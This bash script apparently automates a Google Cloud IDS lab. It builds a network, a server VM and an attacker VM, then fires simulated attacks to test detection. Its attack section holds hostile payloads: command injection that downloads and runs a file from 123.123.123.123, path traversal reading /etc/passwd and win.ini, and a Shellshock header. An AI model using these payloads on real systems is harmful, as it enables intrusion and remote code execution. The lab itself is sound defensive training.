
# Define color variables
BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${BG_MAGENTA}${BOLD}Starting Cloud IDS Lab Execution${RESET}"

# Task 1: Enable APIs
echo "${BLUE}${BOLD}Task 1: Enabling required APIs...${RESET}"
export PROJECT_ID=$(gcloud config get-value project | sed '2d')
echo "Project ID: $PROJECT_ID"

echo "Enabling Service Networking API..."
gcloud services enable servicenetworking.googleapis.com \
    --project=$PROJECT_ID

echo "Enabling Cloud IDS API..."
gcloud services enable ids.googleapis.com \
    --project=$PROJECT_ID

echo "Enabling Cloud Logging API..."
gcloud services enable logging.googleapis.com \
    --project=$PROJECT_ID

echo "${GREEN}All required APIs have been enabled.${RESET}"

# Task 2: Build the Google Cloud networking footprint
echo -e "\n${BLUE}${BOLD}Task 2: Creating VPC network and configuring private services access...${RESET}"
echo "Creating VPC network 'cloud-ids'..."
gcloud compute networks create cloud-ids \
--subnet-mode=custom

echo "Creating subnet 'cloud-ids-useast1' in us-east1 region..."
gcloud compute networks subnets create cloud-ids-useast1 \
--range=192.168.10.0/24 \
--network=cloud-ids \
--region=us-east1

echo "Configuring private services access..."
gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids

echo "Creating private connection..."
gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID

echo "${GREEN}VPC network and private services access configured successfully.${RESET}"

# Task 3: Create a Cloud IDS endpoint
echo -e "\n${BLUE}${BOLD}Task 3: Creating Cloud IDS endpoint...${RESET}"
echo "${YELLOW}Note: The Cloud IDS endpoint creation takes approximately 20 minutes.${RESET}"

echo "Creating Cloud IDS endpoint 'cloud-ids-east1'..."
gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async

echo "Checking Cloud IDS endpoint status..."
gcloud ids endpoints list --project=$PROJECT_ID

echo "${YELLOW}The Cloud IDS endpoint creation is in progress.${RESET}"

# Task 4: Create Firewall rules and Cloud NAT
echo -e "\n${BLUE}${BOLD}Task 4: Creating firewall rules and configuring Cloud NAT...${RESET}"
echo "Creating 'allow-http-icmp' firewall rule..."
gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server

echo "Creating 'allow-iap-proxy' firewall rule..."
gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20

echo "Creating Cloud Router 'cr-cloud-ids-useast1'..."
gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids

echo "Configuring Cloud NAT 'nat-cloud-ids-useast1'..."
gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges

echo "${GREEN}Firewall rules and Cloud NAT created successfully.${RESET}"

# Task 5: Create two virtual machines
echo -e "\n${BLUE}${BOLD}Task 5: Creating server and attacker virtual machines...${RESET}"
echo "Creating 'server' VM..."
gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-11-bullseye-v20240709 \
--image-project=debian-cloud \
--boot-disk-size=10GB

echo "Creating 'attacker' VM..."
gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-11-bullseye-v20240709 \
--image-project=debian-cloud \
--boot-disk-size=10GB

echo "${GREEN}Virtual machines created successfully.${RESET}"

echo -e "\n${BLUE}${BOLD}Preparing server with benign malware file...${RESET}"
echo "Connecting to server VM..."

# Create a temporary script to run on the server
cat > /tmp/server_setup_script.sh << EOF
#!/bin/bash
sudo systemctl status nginx
cd /var/www/html/
sudo touch eicar.file
echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' | sudo tee eicar.file
EOF

chmod +x /tmp/server_setup_script.sh

# Copy script to server and execute
gcloud compute scp /tmp/server_setup_script.sh server:~/ --zone=us-east1-b --tunnel-through-iap
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap --command "bash ~/server_setup_script.sh"

echo "${GREEN}Server prepared with test malware file.${RESET}"

# Task 6: Create a Cloud IDS packet mirroring policy
echo -e "\n${BLUE}${BOLD}Task 6: Creating Cloud IDS packet mirroring policy...${RESET}"
echo "${BG_RED}${BOLD}MANUAL STEP REQUIRED: Wait for Cloud IDS endpoint to be ready${RESET}"
echo "Run the following command periodically to check if the endpoint is ready:"
echo "gcloud ids endpoints list --project=\$PROJECT_ID | grep STATE"
echo "Continue when the status shows 'READY'"
echo "${YELLOW}Press Enter when the Cloud IDS endpoint status is READY...${RESET}"
read

# Identify the Cloud IDS endpoint forwarding rule
echo "Identifying the Cloud IDS endpoint forwarding rule..."
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo "Forwarding rule: $FORWARDING_RULE"

# Create and attach the packet mirroring policy
echo "Creating and attaching the packet mirroring policy..."
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1

# Verify that the packet mirroring policy is created
echo "Verifying packet mirroring policy creation..."
gcloud compute packet-mirrorings list

echo "${GREEN}Packet mirroring policy created and attached successfully.${RESET}"

# Task 7: Simulate attack traffic
echo -e "\n${BLUE}${BOLD}Task 7: Simulating attack traffic...${RESET}"

# Create a temporary script to run on the attacker VM
cat > /tmp/attack_script.sh << EOF
#!/bin/bash
echo "Simulating Low Severity Attack:"
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"

echo -e "\nSimulating Medium Severity Attacks:"
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file

echo -e "\nSimulating High Severity Attack:"
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd

echo -e "\nSimulating Critical Severity Attack:"
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
EOF

chmod +x /tmp/attack_script.sh

# Copy script to attacker and execute
echo "Connecting to attacker VM and running attack simulations..."
gcloud compute scp /tmp/attack_script.sh attacker:~/ --zone=us-east1-b --tunnel-through-iap
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap --command "bash ~/attack_script.sh"

echo "${GREEN}Attack traffic simulated successfully.${RESET}"

# Task 8: Review threats detected by Cloud IDS
echo -e "\n${BLUE}${BOLD}Task 8: Reviewing threats detected by Cloud IDS...${RESET}"
echo "${BG_RED}${BOLD}MANUAL STEP REQUIRED: Review threats in Cloud Console${RESET}"
echo "1. In the Google Cloud Console, navigate to Network Security > Cloud IDS"
echo "2. Click the Threats tab"
echo "3. Locate the 'Bash Remote Code Execution Vulnerability' threat"
echo "4. Click More (three dots) and select 'View threat details'"
echo "5. Return to Threats tab"
echo "6. Click More again and select 'View threat logs'"
echo "${YELLOW}Press Enter when you've completed reviewing the threats...${RESET}"
read

echo "${BG_GREEN}${BOLD}Lab complete! You have successfully:${RESET}"
echo "✅ Enabled required APIs"
echo "✅ Created a VPC network and configured private services access"
echo "✅ Created a Cloud IDS endpoint"
echo "✅ Set up firewall rules and Cloud NAT"
echo "✅ Created server and attacker VMs"
echo "✅ Created a packet mirroring policy"
echo "✅ Simulated attack traffic"
echo "✅ Reviewed threats in Cloud Console"

echo "${BG_RED}${BOLD}Congratulations For Completing The Lab !!!${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#